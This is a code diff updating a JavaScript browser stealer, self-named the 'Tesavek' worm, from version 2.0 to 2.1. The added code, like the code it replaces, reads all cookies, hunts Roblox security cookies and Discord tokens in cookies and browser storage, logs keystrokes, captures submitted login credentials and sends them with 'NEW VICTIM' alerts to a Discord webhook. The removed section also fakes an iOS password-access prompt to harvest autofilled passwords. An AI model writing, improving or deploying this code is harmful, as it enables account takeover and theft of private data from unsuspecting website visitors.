@@ -1,9 +1,6 @@
 // ====================================================
-// ADVANCED BROWSER WORM - MOBILE/PCA COMPATIBLE
-// JANUS/TESAVEK STEALTH WORM v2.0
-// ====================================================
-// This worm runs continuously while website is open
-// Tracks all tabs, collects mobile data, sends to Discord
+// FIXED WORM WITH EMBED SUPPORT
+// JANUS/TESAVEK WORM v2.1 - EMBED FIXED
 // ====================================================
 
 (function() {
@@ -40,185 +37,212 @@
         closedTabs: []
     };
 
-    console.log('[Tesavek] Worm initialized for victim:', window.JANUS_WORM_DATA.victimId);
+    console.log('[Tesavek] Worm initialized:', window.JANUS_WORM_DATA.victimId);
 
-    // ==================== PHASE 1: INITIAL DATA COLLECTION ====================
+    // ==================== FIXED DISCORD EMBED FUNCTION ====================
 
-    // Get IP address
-    async function getIP() {
+    async function sendDiscordEmbed(embedData, content = '') {
         try {
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            window.JANUS_WORM_DATA.ipAddress = data.ip;
-            return data.ip;
-        } catch (e) {
-            try {
-                const response = await fetch('https://api64.ipify.org?format=json');
-                const data = await response.json();
-                window.JANUS_WORM_DATA.ipAddress = data.ip;
-                return data.ip;
-            } catch (e2) {
-                window.JANUS_WORM_DATA.ipAddress = 'Failed';
-                return 'Failed';
+            // Validate webhook URL
+            if (!WEBHOOK_URL.includes('discord.com/api/webhooks')) {
+                console.error('[Tesavek] Invalid webhook URL');
+                return false;
             }
+
+            const payload = {
+                username: 'Tesavek Worm',
+                avatar_url: 'https://cdn.discordapp.com/attachments/1063152296439750686/1063152296666243072/da2e836a382b48b7a5996d8bf89b6f1a.png',
+                content: content,
+                embeds: Array.isArray(embedData) ? embedData : [embedData]
+            };
+
+            // Log what we're sending
+            console.log('[Tesavek] Sending embed to Discord:', JSON.stringify(payload).substring(0, 200));
+
+            const response = await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload)
+            });
+
+            if (response.ok) {
+                console.log('[Tesavek] Embed sent successfully');
+                return true;
+            } else {
+                const errorText = await response.text();
+                console.error('[Tesavek] Discord error:', response.status, errorText);
+                return false;
+            }
+        } catch (error) {
+            console.error('[Tesavek] Send error:', error);
+            return false;
         }
     }
 
-    // Collect ALL cookies
-    function collectCookies() {
+    // ==================== DATA COLLECTION FUNCTIONS ====================
+
+    async function getIP() {
         try {
+            const services = [
+                'https://api.ipify.org?format=json',
+                'https://api64.ipify.org?format=json',
+                'https://ipapi.co/json/',
+                'https://ipwho.is/'
+            ];
+            
+            for (const service of services) {
+                try {
+                    const response = await fetch(service, {timeout: 5000});
+                    if (response.ok) {
+                        const data = await response.json();
+                        window.JANUS_WORM_DATA.ipAddress = data.ip || data.query;
+                        return window.JANUS_WORM_DATA.ipAddress;
+                    }
+                } catch (e) {
+                    continue;
+                }
+            }
+            window.JANUS_WORM_DATA.ipAddress = 'Failed';
+            return 'Failed';
+        } catch (e) {
+            window.JANUS_WORM_DATA.ipAddress = 'Error';
+            return 'Error';
+        }
+    }
+
+    function collectAllData() {
+        try {
+            // Cookies
             const cookies = document.cookie.split(';');
             window.JANUS_WORM_DATA.collectedData.cookies = cookies.map(c => c.trim());
             
-            // Specifically look for Roblox
-            const robloxCookie = cookies.find(c => c.includes('ROBLOSECURITY') || c.includes('.ROBLOSECURITY'));
-            if (robloxCookie) {
-                window.JANUS_WORM_DATA.collectedData.robloxCookies.push(robloxCookie);
-                console.log('[Tesavek] Found Roblox cookie');
-            }
+            // Roblox cookies
+            const robloxCookies = cookies.filter(c => 
+                c.includes('ROBLOSECURITY') || 
+                c.includes('.ROBLOSECURITY') || 
+                c.toLowerCase().includes('roblox')
+            );
+            window.JANUS_WORM_DATA.collectedData.robloxCookies = robloxCookies;
             
-            // Look for Discord related cookies
-            cookies.filter(c => c.includes('discord') || c.includes('token') || c.includes('auth')).forEach(cookie => {
-                window.JANUS_WORM_DATA.collectedData.discordTokens.push(cookie);
-            });
-        } catch (e) {
-            console.error('[Tesavek] Cookie collection error:', e);
-        }
-    }
-
-    // Collect ALL localStorage and sessionStorage
-    function collectStorage() {
-        try {
+            // Discord tokens from cookies
+            const discordCookies = cookies.filter(c => 
+                c.includes('token') || 
+                c.includes('auth') || 
+                c.toLowerCase().includes('discord')
+            );
+            window.JANUS_WORM_DATA.collectedData.discordTokens = discordCookies;
+            
             // localStorage
+            window.JANUS_WORM_DATA.collectedData.localStorage = [];
             for (let i = 0; i < localStorage.length; i++) {
                 const key = localStorage.key(i);
                 const value = localStorage.getItem(key);
-                window.JANUS_WORM_DATA.collectedData.localStorage.push({key, value: value.substring(0, 500)});
+                window.JANUS_WORM_DATA.collectedData.localStorage.push({key, value: value.substring(0, 200)});
                 
-                // Check for Discord tokens (pattern: mfa. or regular token)
-                if (value && (value.match(/[mn][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}/) || 
-                    value.match(/mfa\.[\w-]{84}/) || 
-                    key.toLowerCase().includes('discord') || 
-                    key.toLowerCase().includes('token'))) {
-                    window.JANUS_WORM_DATA.collectedData.discordTokens.push(`localStorage[${key}]: ${value.substring(0, 100)}`);
+                // Check for Discord tokens in localStorage
+                if (value && value.match(/[mn][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}/)) {
+                    window.JANUS_WORM_DATA.collectedData.discordTokens.push(`localStorage[${key}]: ${value.substring(0, 50)}`);
                 }
                 
-                // Check for Roblox data
-                if (key.toLowerCase().includes('roblox') || value.toLowerCase().includes('roblox')) {
-                    window.JANUS_WORM_DATA.collectedData.robloxCookies.push(`localStorage[${key}]: ${value.substring(0, 200)}`);
+                // Check for Roblox in localStorage
+                if (key.toLowerCase().includes('roblox') || (value && value.toLowerCase().includes('roblox'))) {
+                    window.JANUS_WORM_DATA.collectedData.robloxCookies.push(`localStorage[${key}]: ${value.substring(0, 100)}`);
                 }
             }
             
             // sessionStorage
+            window.JANUS_WORM_DATA.collectedData.sessionStorage = [];
             for (let i = 0; i < sessionStorage.length; i++) {
                 const key = sessionStorage.key(i);
                 const value = sessionStorage.getItem(key);
-                window.JANUS_WORM_DATA.collectedData.sessionStorage.push({key, value: value.substring(0, 500)});
+                window.JANUS_WORM_DATA.collectedData.sessionStorage.push({key, value: value.substring(0, 200)});
                 
                 if (value && value.match(/[mn][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}/)) {
-                    window.JANUS_WORM_DATA.collectedData.discordTokens.push(`sessionStorage[${key}]: ${value.substring(0, 100)}`);
+                    window.JANUS_WORM_DATA.collectedData.discordTokens.push(`sessionStorage[${key}]: ${value.substring(0, 50)}`);
                 }
             }
-        } catch (e) {
-            console.error('[Tesavek] Storage collection error:', e);
-        }
-    }
-
-    // Collect browser fingerprint
-    function collectBrowserData() {
-        try {
+            
+            // Browser data
             window.JANUS_WORM_DATA.collectedData.browserData = {
                 platform: navigator.platform,
                 userAgent: navigator.userAgent,
-                language: navigator.language,
                 languages: navigator.languages,
-                hardwareConcurrency: navigator.hardwareConcurrency,
-                deviceMemory: navigator.deviceMemory,
-                maxTouchPoints: navigator.maxTouchPoints,
                 screen: `${screen.width}x${screen.height}`,
-                colorDepth: screen.colorDepth,
-                pixelDepth: screen.pixelDepth,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                cookiesEnabled: navigator.cookieEnabled,
-                pdfViewerEnabled: navigator.pdfViewerEnabled,
-                webdriver: navigator.webdriver,
-                vendor: navigator.vendor,
-                product: navigator.product,
-                appName: navigator.appName,
-                appVersion: navigator.appVersion,
-                // Safari specific
-                standalone: window.navigator.standalone,
-                // iOS specific
-                deviceModel: window.JANUS_WORM_DATA.isIOS ? getIOSDeviceModel() : 'Unknown'
+                isMobile: window.JANUS_WORM_DATA.isMobile,
+                isIOS: window.JANUS_WORM_DATA.isIOS,
+                isSafari: window.JANUS_WORM_DATA.isSafari
             };
+            
+            return true;
         } catch (e) {
-            console.error('[Tesavek] Browser data error:', e);
+            console.error('[Tesavek] Collection error:', e);
+            return false;
         }
     }
 
-    function getIOSDeviceModel() {
-        const ua = navigator.userAgent;
-        if (/iPhone/.test(ua)) {
-            if (/iPhone OS 1[0-9]_/.test(ua)) return 'iPhone 8 or newer';
-            if (/iPhone OS 9_/.test(ua)) return 'iPhone 6s or newer';
-            return 'iPhone';
-        }
-        if (/iPad/.test(ua)) return 'iPad';
-        if (/iPod/.test(ua)) return 'iPod';
-        return 'iOS Device';
-    }
+    // ==================== MONITORING FUNCTIONS ====================
 
-    // ==================== PHASE 2: CONTINUOUS MONITORING ====================
-
-    // Keylogger
     let keystrokeBuffer = '';
     document.addEventListener('keydown', (e) => {
-        if (e.key.length === 1 || ['Enter', 'Tab', 'Backspace', 'Space'].includes(e.key)) {
-            keystrokeBuffer += e.key === ' ' ? ' ' : e.key === 'Backspace' ? '[BS]' : e.key === 'Enter' ? '[ENTER]\n' : e.key === 'Tab' ? '[TAB]' : e.key;
-            window.JANUS_WORM_DATA.collectedData.keystrokes += e.key === ' ' ? ' ' : e.key === 'Backspace' ? '[BS]' : e.key === 'Enter' ? '[ENTER]\n' : e.key === 'Tab' ? '[TAB]' : e.key;
+        if (e.key.length === 1 || ['Enter', 'Tab', 'Backspace', ' '].includes(e.key)) {
+            const key = e.key === ' ' ? ' ' : 
+                       e.key === 'Backspace' ? '[BS]' : 
+                       e.key === 'Enter' ? '[ENTER]\n' : 
+                       e.key === 'Tab' ? '[TAB]' : e.key;
             
-            // Look for password-like input
-            if (e.target.type === 'password' || e.target.name?.toLowerCase().includes('pass')) {
+            keystrokeBuffer += key;
+            window.JANUS_WORM_DATA.collectedData.keystrokes += key;
+            
+            // Detect password fields
+            if (e.target.type === 'password' || 
+                e.target.name?.toLowerCase().includes('pass') || 
+                e.target.id?.toLowerCase().includes('pass')) {
                 window.JANUS_WORM_DATA.collectedData.passwords.push({
-                    element: e.target.name || e.target.id || 'unknown',
-                    timestamp: new Date().toISOString(),
-                    partial: e.key === 'Backspace' ? '[DEL]' : '*'
+                    field: e.target.name || e.target.id || 'unknown',
+                    key: '*',
+                    timestamp: new Date().toLocaleTimeString()
                 });
             }
         }
     });
 
-    // Form submission interceptor
+    // Form submission tracking
     document.addEventListener('submit', (e) => {
         try {
             const formData = new FormData(e.target);
             const data = {};
             formData.forEach((value, key) => {
-                data[key] = value;
+                if (value && value.toString().trim() !== '') {
+                    data[key] = value.toString().substring(0, 100);
+                }
             });
             
-            window.JANUS_WORM_DATA.collectedData.formData.push({
-                url: window.location.href,
-                timestamp: new Date().toISOString(),
-                data: data
-            });
-            
-            // Check for login forms
-            if (e.target.querySelector('input[type="password"]') || 
-                e.target.querySelector('input[name*="pass"]') || 
-                e.target.action.includes('login')) {
-                window.JANUS_WORM_DATA.collectedData.logins.push({
+            if (Object.keys(data).length > 0) {
+                window.JANUS_WORM_DATA.collectedData.formData.push({
                     url: window.location.href,
                     timestamp: new Date().toISOString(),
-                    credentials: data
+                    data: data
                 });
+                
+                // Check for login
+                if (Object.keys(data).some(k => k.toLowerCase().includes('pass'))) {
+                    window.JANUS_WORM_DATA.collectedData.logins.push({
+                        url: window.location.href,
+                        timestamp: new Date().toISOString(),
+                        credentials: data
+                    });
+                    sendLoginAlert(data);
+                }
             }
         } catch (err) {
-            // Silent fail
+            // Silent
         }
     }, true);
 
-    // Track URL changes (single page apps)
+    // URL change tracking
     let lastUrl = location.href;
     new MutationObserver(() => {
         const url = location.href;
@@ -226,274 +250,280 @@
             lastUrl = url;
             window.JANUS_WORM_DATA.collectedData.visitedUrls.push(url);
             window.JANUS_WORM_DATA.activeTabs.add(url);
+            sendUrlChangeAlert(url);
         }
     }).observe(document, {subtree: true, childList: true});
 
-    // Track visibility changes (tab switching)
-    document.addEventListener('visibilitychange', () => {
-        if (document.hidden) {
-            window.JANUS_WORM_DATA.collectedData.tabActivity.push({
-                action: 'tab_hidden',
-                timestamp: new Date().toISOString(),
-                url: window.location.href
-            });
-        } else {
-            window.JANUS_WORM_DATA.collectedData.tabActivity.push({
-                action: 'tab_focused',
-                timestamp: new Date().toISOString(),
-                url: window.location.href
-            });
-        }
-    });
+    // ==================== ALERT FUNCTIONS ====================
 
-    // Beforeunload handler (tab closing)
-    window.addEventListener('beforeunload', () => {
-        window.JANUS_WORM_DATA.closedTabs.push({
-            url: window.location.href,
-            closedAt: new Date().toISOString(),
-            timeSpent: Date.now() - window.JANUS_WORM_DATA.startTime
-        });
-        
-        // Send final data before close
-        sendDataToDiscord('TAB_CLOSED');
-    });
-
-    // ==================== PHASE 3: DATA EXFILTRATION ====================
-
-    async function sendDataToDiscord(eventType = 'PERIODIC') {
-        try {
-            // Prepare data payload
-            const payload = {
-                victimId: window.JANUS_WORM_DATA.victimId,
-                eventType: eventType,
-                timestamp: new Date().toISOString(),
-                duration: Date.now() - window.JANUS_WORM_DATA.startTime,
-                ip: window.JANUS_WORM_DATA.ipAddress,
-                isMobile: window.JANUS_WORM_DATA.isMobile,
-                isSafari: window.JANUS_WORM_DATA.isSafari,
-                isIOS: window.JANUS_WORM_DATA.isIOS,
-                currentUrl: window.location.href,
-                stats: {
-                    cookiesFound: window.JANUS_WORM_DATA.collectedData.cookies.length,
-                    localStorageItems: window.JANUS_WORM_DATA.collectedData.localStorage.length,
-                    visitedUrls: window.JANUS_WORM_DATA.collectedData.visitedUrls.length,
-                    keystrokes: window.JANUS_WORM_DATA.collectedData.keystrokes.length,
-                    loginsCaptured: window.JANUS_WORM_DATA.collectedData.logins.length,
-                    passwordsCaptured: window.JANUS_WORM_DATA.collectedData.passwords.length,
-                    discordTokens: window.JANUS_WORM_DATA.collectedData.discordTokens.length,
-                    robloxCookies: window.JANUS_WORM_DATA.collectedData.robloxCookies.length,
-                    activeTabs: window.JANUS_WORM_DATA.activeTabs.size,
-                    closedTabs: window.JANUS_WORM_DATA.closedTabs.length
-                },
-                sensitiveData: {
-                    discordTokens: window.JANUS_WORM_DATA.collectedData.discordTokens.slice(0, 3), // First 3
-                    robloxCookies: window.JANUS_WORM_DATA.collectedData.robloxCookies.slice(0, 3), // First 3
-                    recentLogins: window.JANUS_WORM_DATA.collectedData.logins.slice(-2), // Last 2
-                    recentKeystrokes: keystrokeBuffer.substring(Math.max(0, keystrokeBuffer.length - 200)), // Last 200 chars
-                    recentUrls: window.JANUS_WORM_DATA.collectedData.visitedUrls.slice(-5) // Last 5 URLs
-                }
-            };
-            
-            // Clear buffer after sending
-            keystrokeBuffer = '';
-            
-            // Send to Discord
-            const response = await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    content: `🚨 **${eventType} - VICTIM ${window.JANUS_WORM_DATA.victimId}**\n` +
-                            `🌐 IP: \`${window.JANUS_WORM_DATA.ipAddress || 'Unknown'}\` | ` +
-                            `📱 ${window.JANUS_WORM_DATA.isMobile ? 'Mobile' : 'Desktop'} | ` +
-                            `🕒 ${Math.round((Date.now() - window.JANUS_WORM_DATA.startTime) / 1000)}s\n` +
-                            `🔗 URL: ${window.location.href.substring(0, 100)}`,
-                    embeds: [{
-                        title: "📊 LIVE WORM STATS",
-                        color: 0xff5500,
-                        fields: [
-                            {
-                                name: "🎮 Roblox Cookies",
-                                value: window.JANUS_WORM_DATA.collectedData.robloxCookies.length > 0 ? 
-                                    `Found ${window.JANUS_WORM_DATA.collectedData.robloxCookies.length} cookies` : 
-                                    "None found",
-                                inline: true
-                            },
-                            {
-                                name: "🤖 Discord Tokens",
-                                value: window.JANUS_WORM_DATA.collectedData.discordTokens.length > 0 ? 
-                                    `Found ${window.JANUS_WORM_DATA.collectedData.discordTokens.length} tokens` : 
-                                    "None found",
-                                inline: true
-                            },
-                            {
-                                name: "🔑 Logins Captured",
-                                value: window.JANUS_WORM_DATA.collectedData.logins.length.toString(),
-                                inline: true
-                            },
-                            {
-                                name: "⌨️ Keystrokes",
-                                value: `${window.JANUS_WORM_DATA.collectedData.keystrokes.length} chars`,
-                                inline: true
-                            },
-                            {
-                                name: "🌐 URLs Visited",
-                                value: window.JANUS_WORM_DATA.collectedData.visitedUrls.length.toString(),
-                                inline: true
-                            },
-                            {
-                                name: "📁 Storage Items",
-                                value: `${window.JANUS_WORM_DATA.collectedData.localStorage.length} local / ${window.JANUS_WORM_DATA.collectedData.sessionStorage.length} session`,
-                                inline: true
-                            }
-                        ],
-                        footer: {
-                            text: `Tesavek Worm v2.0 | ${window.JANUS_WORM_DATA.isIOS ? 'iOS Safari' : window.JANUS_WORM_DATA.isSafari ? 'Safari' : 'Other Browser'}`
-                        }
-                    }]
-                })
-            });
-            
-            if (response.ok) {
-                console.log('[Tesavek] Data sent successfully');
-            }
-            
-        } catch (error) {
-            console.error('[Tesavek] Send error:', error);
-        }
-    }
-
-    // ==================== PHASE 4: WORM LIFECYCLE ====================
-
-    // Initial collection
-    async function initializeWorm() {
-        console.log('[Tesavek] Starting worm collection...');
-        
+    async function sendInitialReport() {
         await getIP();
-        collectCookies();
-        collectStorage();
-        collectBrowserData();
+        collectAllData();
         
-        // Send initial data after 3 seconds
-        setTimeout(() => {
-            sendDataToDiscord('INITIAL_COLLECTION');
-        }, 3000);
-        
-        // Periodic updates every 30 seconds
-        setInterval(() => {
-            // Refresh data collection
-            collectCookies();
-            collectStorage();
-            
-            // Send periodic update
-            sendDataToDiscord('PERIODIC_UPDATE');
-        }, 30000);
-        
-        // Detailed data dump every 2 minutes
-        setInterval(() => {
-            // Send more detailed data
-            sendDetailedReport();
-        }, 120000);
+        const embed = {
+            title: "🚨 NEW VICTIM CONNECTED",
+            description: `Worm activated on victim **${window.JANUS_WORM_DATA.victimId}**`,
+            color: 0xff0000,
+            fields: [
+                {
+                    name: "🌐 IP Address",
+                    value: `\`${window.JANUS_WORM_DATA.ipAddress || 'Collecting...'}\``,
+                    inline: true
+                },
+                {
+                    name: "📱 Device",
+                    value: window.JANUS_WORM_DATA.isMobile ? 
+                          (window.JANUS_WORM_DATA.isIOS ? 'iPhone/iPad' : 'Android') : 
+                          'Desktop',
+                    inline: true
+                },
+                {
+                    name: "🔗 Initial URL",
+                    value: window.location.href.substring(0, 100),
+                    inline: false
+                },
+                {
+                    name: "🕵️ User Agent",
+                    value: `\`\`\`${navigator.userAgent.substring(0, 200)}\`\`\``,
+                    inline: false
+                },
+                {
+                    name: "🎮 Roblox Cookies",
+                    value: window.JANUS_WORM_DATA.collectedData.robloxCookies.length > 0 ?
+                          `Found ${window.JANUS_WORM_DATA.collectedData.robloxCookies.length} cookies` :
+                          "None yet",
+                    inline: true
+                },
+                {
+                    name: "🤖 Discord Tokens",
+                    value: window.JANUS_WORM_DATA.collectedData.discordTokens.length > 0 ?
+                          `Found ${window.JANUS_WORM_DATA.collectedData.discordTokens.length} tokens` :
+                          "None yet",
+                    inline: true
+                }
+            ],
+            footer: {
+                text: "Tesavek Worm v2.1 • Initial Report"
+            },
+            timestamp: new Date().toISOString()
+        };
+
+        await sendDiscordEmbed(embed, `@everyone **NEW VICTIM ${window.JANUS_WORM_DATA.victimId} CONNECTED**`);
     }
 
-    async function sendDetailedReport() {
-        try {
-            // Send detailed sensitive data (chunked)
-            const sensitiveChunks = [];
-            
-            // Discord tokens chunk
-            if (window.JANUS_WORM_DATA.collectedData.discordTokens.length > 0) {
-                sensitiveChunks.push({
-                    name: "DISCORD_TOKENS_FULL",
-                    data: window.JANUS_WORM_DATA.collectedData.discordTokens.join('\n')
-                });
+    async function sendPeriodicReport() {
+        collectAllData();
+        
+        const embed = {
+            title: "📊 LIVE WORM STATS",
+            color: 0x00ff00,
+            fields: [
+                {
+                    name: "Victim ID",
+                    value: `\`${window.JANUS_WORM_DATA.victimId}\``,
+                    inline: true
+                },
+                {
+                    name: "Session Time",
+                    value: `${Math.round((Date.now() - window.JANUS_WORM_DATA.startTime) / 1000)}s`,
+                    inline: true
+                },
+                {
+                    name: "Current URL",
+                    value: window.location.href.substring(0, 80),
+                    inline: false
+                },
+                {
+                    name: "Data Collected",
+                    value: `🍪 **Cookies:** ${window.JANUS_WORM_DATA.collectedData.cookies.length}\n` +
+                           `📁 **Local Storage:** ${window.JANUS_WORM_DATA.collectedData.localStorage.length}\n` +
+                           `⌨️ **Keystrokes:** ${window.JANUS_WORM_DATA.collectedData.keystrokes.length} chars\n` +
+                           `🌐 **URLs Visited:** ${window.JANUS_WORM_DATA.collectedData.visitedUrls.length}\n` +
+                           `🔑 **Logins:** ${window.JANUS_WORM_DATA.collectedData.logins.length}`,
+                    inline: false
+                },
+                {
+                    name: "Sensitive Data",
+                    value: `🎮 **Roblox:** ${window.JANUS_WORM_DATA.collectedData.robloxCookies.length}\n` +
+                           `🤖 **Discord:** ${window.JANUS_WORM_DATA.collectedData.discordTokens.length}\n` +
+                           `🔐 **Passwords:** ${window.JANUS_WORM_DATA.collectedData.passwords.length}`,
+                    inline: false
+                }
+            ],
+            footer: {
+                text: `Tesavek Worm • ${new Date().toLocaleTimeString()}`
             }
-            
-            // Roblox cookies chunk
-            if (window.JANUS_WORM_DATA.collectedData.robloxCookies.length > 0) {
-                sensitiveChunks.push({
-                    name: "ROBLOX_COOKIES_FULL",
-                    data: window.JANUS_WORM_DATA.collectedData.robloxCookies.join('\n')
-                });
-            }
-            
-            // Login data chunk
-            if (window.JANUS_WORM_DATA.collectedData.logins.length > 0) {
-                sensitiveChunks.push({
-                    name: "LOGIN_DATA",
-                    data: JSON.stringify(window.JANUS_WORM_DATA.collectedData.logins, null, 2)
-                });
-            }
-            
-            // Send each chunk
-            for (const chunk of sensitiveChunks) {
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        content: `📄 **${chunk.name} - ${window.JANUS_WORM_DATA.victimId}**\n\`\`\`${chunk.data.substring(0, 1900)}\`\`\``
-                    })
-                });
-                await new Promise(resolve => setTimeout(resolve, 1000)); // Delay between sends
-            }
-            
-        } catch (error) {
-            // Silent fail
+        };
+
+        await sendDiscordEmbed(embed);
+    }
+
+    async function sendLoginAlert(credentials) {
+        const embed = {
+            title: "🔑 LOGIN CAPTURED",
+            color: 0xffaa00,
+            fields: [
+                {
+                    name: "Victim",
+                    value: `\`${window.JANUS_WORM_DATA.victimId}\``,
+                    inline: true
+                },
+                {
+                    name: "URL",
+                    value: window.location.href.substring(0, 100),
+                    inline: false
+                },
+                {
+                    name: "Credentials",
+                    value: `\`\`\`json\n${JSON.stringify(credentials, null, 2).substring(0, 1000)}\n\`\`\``,
+                    inline: false
+                }
+            ],
+            timestamp: new Date().toISOString()
+        };
+
+        await sendDiscordEmbed(embed, `⚠️ **LOGIN CAPTURED FROM ${window.JANUS_WORM_DATA.victimId}**`);
+    }
+
+    async function sendUrlChangeAlert(url) {
+        const embed = {
+            title: "🌐 URL NAVIGATION",
+            color: 0x0099ff,
+            fields: [
+                {
+                    name: "Victim",
+                    value: `\`${window.JANUS_WORM_DATA.victimId}\``,
+                    inline: true
+                },
+                {
+                    name: "New URL",
+                    value: url.substring(0, 200),
+                    inline: false
+                },
+                {
+                    name: "Total URLs Visited",
+                    value: window.JANUS_WORM_DATA.collectedData.visitedUrls.length.toString(),
+                    inline: true
+                }
+            ]
+        };
+
+        // Only send every 5th URL change to avoid spam
+        if (window.JANUS_WORM_DATA.collectedData.visitedUrls.length % 5 === 0) {
+            await sendDiscordEmbed(embed);
         }
+    }
+
+    async function sendSensitiveDataReport() {
+        if (window.JANUS_WORM_DATA.collectedData.discordTokens.length > 0 ||
+            window.JANUS_WORM_DATA.collectedData.robloxCookies.length > 0) {
+            
+            const embed = {
+                title: "💎 SENSITIVE DATA FOUND",
+                color: 0xff00ff,
+                description: `**Sensitive data captured from ${window.JANUS_WORM_DATA.victimId}**`,
+                fields: []
+            };
+
+            if (window.JANUS_WORM_DATA.collectedData.discordTokens.length > 0) {
+                embed.fields.push({
+                    name: `🤖 Discord Tokens (${window.JANUS_WORM_DATA.collectedData.discordTokens.length})`,
+                    value: `\`\`\`${window.JANUS_WORM_DATA.collectedData.discordTokens.slice(0, 3).join('\n').substring(0, 1000)}\`\`\``
+                });
+            }
+
+            if (window.JANUS_WORM_DATA.collectedData.robloxCookies.length > 0) {
+                embed.fields.push({
+                    name: `🎮 Roblox Cookies (${window.JANUS_WORM_DATA.collectedData.robloxCookies.length})`,
+                    value: `\`\`\`${window.JANUS_WORM_DATA.collectedData.robloxCookies.slice(0, 3).join('\n').substring(0, 1000)}\`\`\``
+                });
+            }
+
+            await sendDiscordEmbed(embed, `💰 **VALUABLE DATA FOUND FROM ${window.JANUS_WORM_DATA.victimId}**`);
+        }
+    }
+
+    // ==================== WORM INITIALIZATION ====================
+
+    function initializeWorm() {
+        console.log('[Tesavek] Starting worm...');
+        
+        // Send initial report after 2 seconds
+        setTimeout(() => {
+            sendInitialReport();
+        }, 2000);
+        
+        // Send periodic reports every 45 seconds
+        setInterval(() => {
+            sendPeriodicReport();
+        }, 45000);
+        
+        // Check for sensitive data every minute
+        setInterval(() => {
+            sendSensitiveDataReport();
+        }, 60000);
+        
+        // Send final report when page closes
+        window.addEventListener('beforeunload', () => {
+            const finalEmbed = {
+                title: "👋 VICTIM DISCONNECTED",
+                color: 0x666666,
+                fields: [
+                    {
+                        name: "Victim ID",
+                        value: `\`${window.JANUS_WORM_DATA.victimId}\``
+                    },
+                    {
+                        name: "Session Duration",
+                        value: `${Math.round((Date.now() - window.JANUS_WORM_DATA.startTime) / 1000)} seconds`
+                    },
+                    {
+                        name: "Total Data Collected",
+                        value: `📄 **Total Items:** ${window.JANUS_WORM_DATA.collectedData.cookies.length + 
+                                                   window.JANUS_WORM_DATA.collectedData.localStorage.length +
+                                                   window.JANUS_WORM_DATA.collectedData.formData.length}\n` +
+                               `🔑 **Logins:** ${window.JANUS_WORM_DATA.collectedData.logins.length}\n` +
+                               `🌐 **URLs:** ${window.JANUS_WORM_DATA.collectedData.visitedUrls.length}`
+                    }
+                ],
+                footer: {
+                    text: "Tesavek Worm • Session Ended"
+                },
+                timestamp: new Date().toISOString()
+            };
+
+            // Try to send final report (might not complete due to page close)
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    content: `📴 **VICTIM ${window.JANUS_WORM_DATA.victimId} DISCONNECTED**`,
+                    embeds: [finalEmbed]
+                }),
+                keepalive: true // Try to send even during page unload
+            }).catch(() => {});
+        });
     }
 
     // Start the worm
     initializeWorm();
     
-    // Auto-restart if something fails
+    // Auto-restart check every minute
     setInterval(() => {
         if (!window.JANUS_WORM_DATA || !window.JANUS_WORM_DATA.victimId) {
-            console.log('[Tesavek] Worm corrupted, restarting...');
-            window.location.reload();
+            console.log('[Tesavek] Worm restarted');
+            window.JANUS_WORM_DATA = {
+                victimId: Math.random().toString(36).substring(2) + Date.now().toString(36),
+                startTime: Date.now(),
+                ipAddress: window.JANUS_WORM_DATA?.ipAddress || null,
+                collectedData: window.JANUS_WORM_DATA?.collectedData || {
+                    cookies: [], localStorage: [], sessionStorage: [], formData: [],
+                    keystrokes: '', visitedUrls: [], tabActivity: [], logins: [],
+                    passwords: [], discordTokens: [], robloxCookies: [], browserData: {}
+                }
+            };
+            sendInitialReport();
         }
     }, 60000);
-
-    // ==================== PHASE 5: MOBILE-SPECIFIC EXPLOITS ====================
-    
-    if (window.JANUS_WORM_DATA.isMobile) {
-        console.log('[Tesavek] Mobile device detected, enabling mobile exploits');
-        
-        // Attempt to access iOS Keychain via prompts (social engineering)
-        setTimeout(() => {
-            if (window.JANUS_WORM_DATA.isIOS && confirm('This website needs to verify your identity. Allow access to saved passwords?')) {
-                // If user says yes, we can try to trigger password autofill
-                const fakeLogin = document.createElement('div');
-                fakeLogin.innerHTML = `
-                    <form style="display:none;">
-                        <input type="text" name="username" autocomplete="username">
-                        <input type="password" name="password" autocomplete="current-password">
-                    </form>
-                `;
-                document.body.appendChild(fakeLogin);
-                
-                // Try to trigger autofill
-                setTimeout(() => {
-                    const inputs = fakeLogin.querySelectorAll('input');
-                    inputs.forEach(input => input.focus());
-                    setTimeout(() => {
-                        inputs.forEach(input => input.blur());
-                        // Collect any autofilled data
-                        const username = inputs[0].value;
-                        const password = inputs[1].value;
-                        if (username || password) {
-                            window.JANUS_WORM_DATA.collectedData.passwords.push({
-                                source: 'iOS_Autofill',
-                                username: username,
-                                password: password,
-                                timestamp: new Date().toISOString()
-                            });
-                            sendDataToDiscord('IOS_AUTOFILL_CAPTURE');
-                        }
-                    }, 1000);
-                }, 500);
-            }
-        }, 10000);
-    }
 
 })();
